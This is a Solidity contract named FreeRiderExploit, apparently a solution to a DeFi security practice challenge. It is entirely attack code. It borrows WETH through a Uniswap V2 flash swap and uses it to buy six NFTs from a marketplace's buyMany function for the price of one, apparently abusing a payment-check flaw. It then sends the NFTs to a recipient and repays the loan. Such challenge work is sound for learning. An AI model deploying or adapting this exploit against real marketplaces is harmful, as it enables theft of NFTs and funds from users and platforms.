//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface SimpleWETH9 {
    function withdraw(uint256 amount) external;

    function deposit() external payable;

    function transfer(address dst, uint256 wad) external returns (bool);
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IUniFactory {
    function getPair(address a, address b) external returns (address);
}

interface UniRouter {
    function getAmountsIn(uint256 amountOut, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);
}

interface UniPair {
    function token0() external returns (address);

    function token1() external returns (address);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FreeRiderExploit is IERC721Receiver {
    using Address for address payable;
    address public uniPair;
    address public recipient;
    IERC721 private immutable nft;
    UniRouter public uniRouter;

    constructor(
        address _uniPair,
        address _uniRouter,
        address _recipient,
        address _nft
    ) public {
        uniPair = _uniPair;
        recipient = _recipient;
        nft = IERC721(_nft);
        uniRouter = UniRouter(_uniRouter);
    }

    function flashLoan(
        address weth,
        address other,
        uint256 amount0,
        uint256 amount1,
        address marketPlace,
        address uniswapFactoryAddress
    ) external {
        address pairAddress = IUniFactory(uniswapFactoryAddress).getPair(weth, other);
        require(pairAddress != address(0), "This pool does not exist");
        UniPair(pairAddress).swap(
            amount0,
            amount1,
            address(this),
            bytes(addressToBytes(marketPlace))
        );
    }

    function uniswapV2Call(
        address _sender,
        uint256 wethAmount,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        address[] memory path = new address[](2);
        address[] memory reversePath = new address[](2);
        uint256 amountToken = wethAmount == 0 ? _amount1 : wethAmount;

        SimpleWETH9 weth = SimpleWETH9(payable(UniPair(msg.sender).token0()));
        address token1 = UniPair(msg.sender).token1();

        require(wethAmount == 0 || _amount1 == 0, "Wrong amounts");

        path[0] = wethAmount == 0 ? token1 : address(weth);
        path[1] = wethAmount == 0 ? address(weth) : token1;
        reversePath[0] = path[1];
        reversePath[1] = path[0];

        address marketPlace = bytesToAddress(_data);
        weth.withdraw(wethAmount);

        uint256[] memory nftIds = new uint256[](6);
        for (uint256 i; i < 6; i++) {
            nftIds[i] = i;
        }
        IMarketplace(marketPlace).buyMany{ value: wethAmount }(nftIds);

        for (uint256 i; i < 6; i++) nft.safeTransferFrom(address(this), recipient, i);

        uint256[] memory amountRequired = uniRouter.getAmountsIn(amountToken, reversePath);
        weth.deposit{ value: amountRequired[0] }();
        weth.transfer(msg.sender, amountRequired[0]);
    }

    function addressToBytes(address add) public pure returns (bytes memory) {
        return abi.encodePacked(add);
    }

    function bytesToAddress(bytes memory bys) public pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function testing(address payable recipient) public payable {
        recipient.sendValue(msg.value);
    }

    receive() external payable {}
}
